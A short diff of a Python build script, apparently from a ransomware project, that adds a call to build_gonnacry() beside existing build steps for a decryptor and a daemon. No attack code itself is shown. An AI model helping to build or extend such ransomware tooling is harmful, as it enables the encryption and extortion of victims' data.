@@ -57,6 +57,7 @@ def clean_dist():
 def main():
     decryptor64 = build_decryptor()
     daemon64 = build_daemon()
+    gonnacry64 = build_gonnacry()
 
 if __name__ =='__main__':
     main()
